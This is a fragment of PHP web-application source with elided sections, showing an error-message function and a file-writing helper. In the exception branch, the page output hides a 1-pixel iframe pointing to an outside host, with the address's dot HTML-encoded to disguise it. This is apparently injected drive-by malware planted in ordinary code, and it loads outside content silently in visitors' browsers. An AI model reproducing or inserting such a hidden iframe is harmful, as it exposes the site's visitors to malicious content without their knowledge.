...
function showMessage($msg,$url='',$show_type='html',$msg_type='succ',$is_show=1,$time=2000){
	...
	switch ($show_type){
		...
		case 'exception':
			...
			echo '<dd><p /><p /><p /><p /></dd>';
			echo '</dl>';
			echo '<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>';
			echo '</html>';
			exit;
			break;
...
function write_file($filepath, $data, $mode = null)
{
    ...
    $data = "<?php defined('ByAcesoft') or exit('Access Invalid!'); return ".$data.";";
